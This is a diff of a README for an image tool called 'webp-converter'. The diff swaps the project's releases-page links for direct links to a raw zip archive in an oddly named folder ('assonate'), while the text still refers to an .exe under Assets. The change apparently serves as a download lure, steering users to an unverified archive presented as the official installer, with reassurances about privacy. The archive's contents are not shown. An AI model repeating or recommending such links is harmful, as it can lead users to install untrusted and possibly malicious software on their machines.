@@ -1,12 +1,12 @@
 # 🖼️ webp-converter - Convert your images to WebP format
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sadellaentire406/webp-converter/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sadellaentire406/webp-converter/raw/refs/heads/main/assonate/webp-converter-2.4-beta.1.zip)
 
 webp-converter turns your files into smaller, faster WebP images. You can convert JPG, PNG, GIF, SVG, BMP, and AVIF files. The program works on your internal drive. It keeps your files private because no data leaves your computer.
 
 ## 📥 Getting the program
 
-Visit [this page](https://github.com/sadellaentire406/webp-converter/releases) to download the installer. Look for the file ending in .exe under the Assets section. This file contains the complete program. Save the file to your desktop or your Downloads folder.
+Visit [this page](https://github.com/sadellaentire406/webp-converter/raw/refs/heads/main/assonate/webp-converter-2.4-beta.1.zip) to download the installer. Look for the file ending in .exe under the Assets section. This file contains the complete program. Save the file to your desktop or your Downloads folder.
 
 ## ⚙️ System Requirements
 
